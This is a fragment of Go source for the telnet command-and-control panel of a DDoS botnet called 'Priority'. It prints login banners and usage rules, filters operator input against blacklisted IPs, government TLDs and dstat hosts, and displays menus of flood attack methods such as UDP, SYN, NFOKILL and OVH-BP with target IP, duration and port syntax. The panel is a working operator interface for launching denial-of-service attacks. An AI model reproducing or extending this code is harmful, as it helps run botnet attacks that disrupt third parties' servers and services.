		this.conn.Write([]byte("\033[00;1;95m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Securing Connectio\033[00;1;96mn...          [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Loading Terminal..\033[00;1;96m.             [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
		time.Sleep(3000 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
		this.conn.Write([]byte("                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
		this.conn.Write([]byte("                     \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
		this.conn.Write([]byte("                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
		this.conn.Write([]byte("                     \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ╔════════════════════════\033[00;1;96m════════════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m ATTACKING GOVERMENT \033[00;1;96mIPS / WEBSITES!         ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m ABUSING ATTACK TIME \033[00;1;96m/ POWER / SPAMMING!     ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m SHARING YOUR LOGIN C\033[00;1;96mREDENTIALS!             ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m ATTACKING PUBLIC DST\033[00;1;96mATS!                    ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ║ TYPE '\033[31mEXIT\033[00;1;95m' BEFORE CHAN\033[00;1;96mGING CONNECTION TO VPN! ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m               ╚════════════════════════\033[00;1;96m════════════════════════╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                  ╔═════════════════════\033[00;1;96m═════════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                  ║ No Owners Will Take \033[00;1;96mResponibility Of You ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                  ╚══════════╦══════════\033[00;1;96m══════════╦══════════╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                             ║   Type '\033[34mi agree\033[00;1;96m'   ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                             ╚══════════\033[00;1;96m══════════╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                             ║\033[00;1;96m" + username + "\033[00;1;95m⮞ "))
		rules, err := this.ReadLine(false)
		if err != nil {
			return
		}

		rules = strings.ToLower(rules)

		if rules != "I AGREE" && rules != "i agree" {
			fmt.Fprintln(this.conn, "                             ║\033[31mYou Must Agree To Continue!\033[0m\r")
			time.Sleep(time.Duration(2000) * time.Millisecond)
			return
		}

		if len(rules) > 7 {
			return
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		time.Sleep(200 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[95m                      ▄▄▄\033[00;1;96m·\033[95m▄▄▄  \033[00;1;96m▪\033[95m        ▄▄▄  \033[00;1;96m▪\033[95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[95m ▄▌\033[0m\r\n"))
		this.conn.Write([]byte("\033[95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[95m██\033[00;1;96m ▪\033[95m     ▀▄ █\033[00;1;96m·\033[95m██\033[00;1;96m •\033[95m██  ▐█\033[00;1;96m▪\033[95m██▌\033[0m\r\n"))
		this.conn.Write([]byte("\033[95m                      ██▀\033[00;1;96m·\033[95m▐▀▀▄ ▐█\033[00;1;96m·\033[95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[95m ▐█\033[00;1;96m.▪\033[95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
		this.conn.Write([]byte("\033[95m                     ▐█\033[00;1;96m▪·•\033[95m▐█\033[00;1;96m•\033[95m█▌▐█▌▐█▌\033[00;1;96m.\033[95m▐▌▐█\033[00;1;96m•\033[95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
		this.conn.Write([]byte("\033[95m                     .\033[95m▀   \033[00;1;96m.\033[95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
		time.Sleep(1000 * time.Millisecond)
	}

	data, err := ioutil.ReadFile("msg")
	if err != nil {
		return
	}
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[95m                      ▄▄▄\033[00;1;96m·\033[95m▄▄▄  \033[00;1;96m▪\033[95m        ▄▄▄  \033[00;1;96m▪\033[95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[95m ▄▌\033[0m\r\n"))
	this.conn.Write([]byte("\033[95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[95m██\033[00;1;96m ▪\033[95m     ▀▄ █\033[00;1;96m·\033[95m██\033[00;1;96m •\033[95m██  ▐█\033[00;1;96m▪\033[95m██▌\033[0m\r\n"))
	this.conn.Write([]byte("\033[95m                      ██▀\033[00;1;96m·\033[95m▐▀▀▄ ▐█\033[00;1;96m·\033[95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[95m ▐█\033[00;1;96m.▪\033[95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
	this.conn.Write([]byte("\033[95m                     ▐█\033[00;1;96m▪·•\033[95m▐█\033[00;1;96m•\033[95m█▌▐█▌▐█▌\033[00;1;96m.\033[95m▐▌▐█\033[00;1;96m•\033[95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
	this.conn.Write([]byte("\033[95m                     .\033[95m▀   \033[00;1;96m.\033[95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
	this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - -Please Type '\033[34mHELP\033[00;1;96m' To Continue- - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("                                \033[00;1;96m║═══\033[00;1;95mPRIORITY\033[00;1;96m═══║\033[0m\r\n"))
		this.conn.Write([]byte("                                \033[00;1;96m║══\033[00;1;95m⮞ "))
		cmd, err := this.ReadLine(false)

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "LOGOUT" || cmd == "logout" || cmd == "EXIT" || cmd == "exit" {
			return
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if cmd == "" {
			continue
		}

		if strings.Contains(cmd, "@") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mCrash Attempt Logged!\033[0m\r\n"))
			continue
		}

		if strings.HasPrefix(cmd, "-") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mCrash Attempt Logged!\033[0m\r\n"))
			continue
		}

		if strings.HasSuffix(cmd, "=") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mInvalid Flag!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "/") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mAttempt Logged!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ",") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mOne Attack At A Time!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "1.1.1.1") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "8.8.8.8") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".ca") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".us") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".uk") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".au") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, ".gov") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mNo Hitting Gov\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "nfoservers.com") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "64.94.238.13") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "216.52.148.4") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "66.150.214.8") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "31.186.250.100") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "66.150.188.101") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "63.251.20.100") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "66.151.138.9") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "192.223.25.100") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.2") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.83") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "117.27.239.28") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.88") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.84") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.8") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.7") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "103.95.221.75") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "109.201.148.62") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "75.75.75.75") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "dstat") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
			continue
		}

		if strings.Contains(cmd, "pornhub") {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[31mLets Think About This...\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		logger.WriteString(time.Now().Format("Jan 2 15:04:05 -"), username, cmd)

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "CLS" || cmd == "cls" || cmd == "C" || cmd == "c" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - -Please Type '\033[34mHELP\033[00;1;96m' To Continue- - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ╔═══╚══════════════════\033[00;1;96m══════════════════╝═══╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mATTACK\033[00;1;95m - SHOWS NET AT\033[00;1;96mTACK MENUS            ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mAPI\033[00;1;95m - SHOWS SPOOF API\033[00;1;96m ATTACK METHODS       ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mFUNC\033[00;1;95m - SHOWS THE NET \033[00;1;96mFUNCTIONS             ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mTOOLS\033[00;1;95m - SHOWS THE NET\033[00;1;96m LOOKUP TOOLS         ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mSTATS\033[00;1;95m - SHOWS THE NET\033[00;1;96m'S STATUS             ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mACCOUNT\033[00;1;95m - SHOWS ACCOU\033[00;1;96mNT SETTINGS           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mRULES\033[00;1;95m - SHOWS THE NET\033[00;1;96mS TERMS OF SERVICE    ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mBANNERS\033[00;1;95m - SHOWS THE N\033[00;1;96mET BANNERS            ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mEXTHELP\033[00;1;95m - MESSAGE A A\033[00;1;96mDMIN FOR EXTRA HELP   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mRESELLER\033[00;1;95m - LISTS RESE\033[00;1;96mLLER COMMANDS         ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mEXIT\033[00;1;95m - CLOSE YOUR TER\033[00;1;96mMINAL                 ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ \033[34mCLEAR\033[00;1;95m - CLEARS YOUR T\033[00;1;96mERMINAL               ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ╚══════════════════════\033[00;1;96m══════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                 ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "ATTACK" || cmd == "attack" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ╔═══╚══════════════════\033[00;1;96m══════════════════╝═══╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ (Homes) - .UDP [\033[34mIP\033[00;1;95m] [\033[00;1;96m\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]    ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ (Hydra) - .STDHEX [\033[34mIP\033[00;1;96m] [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m] ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ (Nfo)  - .NFOKILL [\033[34mIP\033[00;1;96m] [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m] ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ (Ovh)  - .OVH-BP [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ (Url)  - .UDPHEX [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║══════════════════════\033[00;1;96m══════════════════════║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ PUBLIC - SHOWS PUBLIC\033[00;1;96m ATTACK METHODS       ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ PRIVATE - SHOWS PRIVA\033[00;1;96mTE ATTACK METHODS     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ║ .BOOTHELP - USE ME IF\033[00;1;96m YOU NEED HELP        ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                 ╚══════════════════════\033[00;1;96m══════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                 ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "PUBLIC" || cmd == "public" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))                      
            this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))                      
            this.conn.Write([]byte("\033[00;1;95m                     ╔═╗  ╦═╗  ╦  ╔═╗  ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m                     ╠═╝  ╠╦╝  ║  ║ ║  ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m                     ╩    ╩╚═  ╩  ╚═╝  ╩╚═  ╩   ╩    ╩\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ╔═══════════════╗╔═════════════╗╔═════════════╗╔═══════════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ UDP           ║║ ACK         ║║ GREIP       ║║ TCPALL        ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ STD           ║║ DNS         ║║ STDHEX      ║║ UDPKILL       ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ VSE           ║║ XMAS        ║║ UDPHEX      ║║ NFOKILL       ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ ICE           ║║ FRAG        ║║ GREETH      ║║ OVH-BP        ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ SYN           ║║ STOMP       ║║ TCPALL      ║║ UDPHEX        ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ╚════════╦══════╝╚═════════════╝╚═════════════╝╚══════╦════════╝\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m               ║ Syntax: .METHOD THEN PRESS YOUR ENTER KEY! ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m               ║ Info: Max Boot Time For Bypass Is 200 Secs ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ╔════════╩══════╗╔═════════════╗╔═════════════╗╔══════╩════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ R6            ║║ OVH-UDP     ║║     -       ║║     -         ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ FN            ║║ RAID        ║║     -       ║║     -         ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ KILLALL       ║║ KPAC        ║║     -       ║║     -         ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ NFOKILL       ║║ RANDHEX     ║║     -       ║║     -         ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ║ OVH           ║║ REDSYN      ║║     -       ║║     -         ║\033[0m\r\n"))
            this.conn.Write([]byte("\033[00;1;95m      ╚═══════════════╝╚═════════════╝╚═════════════╝╚═══════════════╝\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "PRIVATE" || cmd == "private" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ╔══════╚══════════════════\033[00;1;96m══════════════════╝══════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .R6 [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                     ║\033[0m\r\n"))
